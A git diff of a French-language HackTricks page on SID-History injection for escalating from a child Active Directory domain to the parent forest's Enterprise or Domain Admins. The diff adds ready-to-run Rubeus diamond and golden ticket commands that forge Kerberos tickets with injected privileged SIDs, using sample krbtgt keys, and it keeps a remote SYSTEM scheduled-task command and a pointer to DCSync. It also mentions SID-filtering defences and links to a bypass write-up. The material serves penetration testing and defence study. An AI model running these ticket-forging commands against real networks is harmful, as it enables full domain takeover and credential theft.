@@ -1,20 +1,48 @@
-# Injection de l'historique SID
+# SID-History Injection
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Attaque par injection de l'historique SID
+## Attaque par Injection de SID History
 
-L'objectif de l'**attaque par injection de l'historique SID** est d'aider à **la migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est accompli en **incorporant l'identifiant de sécurité (SID) précédent de l'utilisateur dans l'historique SID** de son nouveau compte. Notamment, ce processus peut être manipulé pour accorder un accès non autorisé en ajoutant le SID d'un groupe à privilèges élevés (tel que les Administrateurs d'Entreprise ou les Administrateurs de Domaine) du domaine parent à l'historique SID. Cette exploitation confère l'accès à toutes les ressources au sein du domaine parent.
+L'objectif de l'**Attaque par Injection de SID History** est d'aider à la **migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est accompli en **incorporant l'Identifiant de Sécurité (SID) précédent de l'utilisateur dans l'historique SID** de son nouveau compte. Notamment, ce processus peut être manipulé pour accorder un accès non autorisé en ajoutant le SID d'un groupe à privilèges élevés (tel que les Administrateurs d'Entreprise ou les Administrateurs de Domaine) du domaine parent à l'historique SID. Cette exploitation confère l'accès à toutes les ressources au sein du domaine parent.
 
 Deux méthodes existent pour exécuter cette attaque : par la création d'un **Golden Ticket** ou d'un **Diamond Ticket**.
 
 Pour identifier le SID du groupe **"Administrateurs d'Entreprise"**, il faut d'abord localiser le SID du domaine racine. Après identification, le SID du groupe Administrateurs d'Entreprise peut être construit en ajoutant `-519` au SID du domaine racine. Par exemple, si le SID du domaine racine est `S-1-5-21-280534878-1496970234-700767426`, le SID résultant pour le groupe "Administrateurs d'Entreprise" serait `S-1-5-21-280534878-1496970234-700767426-519`.
 
-Vous pouvez également utiliser les groupes **Administrateurs de Domaine**, qui se terminent par **512**.
+Vous pourriez également utiliser les groupes **Administrateurs de Domaine**, qui se terminent par **512**.
 
 Une autre façon de trouver le SID d'un groupe de l'autre domaine (par exemple "Administrateurs de Domaine") est avec :
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Notez qu'il est possible de désactiver l'historique SID dans une relation de confiance, ce qui fera échouer cette attaque.
+
+Selon les [**docs**](https://technet.microsoft.com/library/cc835085.aspx) :
+- **Désactivation de l'historique SID sur les forêts de confiance** en utilisant l'outil netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Application de la mise en quarantaine du filtre SID aux relations de confiance externes** en utilisant l'outil netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Application du filtrage SID aux relations de confiance de domaine au sein d'une seule forêt** n'est pas recommandé car c'est une configuration non prise en charge et peut entraîner des changements disruptifs. Si un domaine au sein d'une forêt est peu fiable, il ne devrait pas être membre de la forêt. Dans cette situation, il est nécessaire de d'abord séparer les domaines de confiance et non fiables en forêts distinctes où le filtrage SID peut être appliqué à une relation de confiance inter-forêts.
+
+Consultez ce post pour plus d'informations sur le contournement de cela : [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+La dernière fois que j'ai essayé cela, j'ai dû ajouter l'arg **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Golden Ticket (Mimikatz) avec KRBTGT-AES256
 ```bash
@@ -39,17 +67,8 @@ Pour plus d'informations sur les golden tickets, consultez :
 golden-ticket.md
 {{#endref}}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
-Pour plus d'informations sur les tickets diamant, consultez :
+Pour plus d'informations sur les diamond tickets, consultez :
 
 {{#ref}}
 diamond-ticket.md
@@ -71,7 +90,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Avec les autorisations acquises lors de l'attaque, vous pouvez exécuter par exemple une attaque DCSync dans le nouveau domaine :
+Avec les autorisations acquises grâce à l'attaque, vous pouvez exécuter par exemple une attaque DCSync dans le nouveau domaine :
 
 {{#ref}}
 dcsync.md
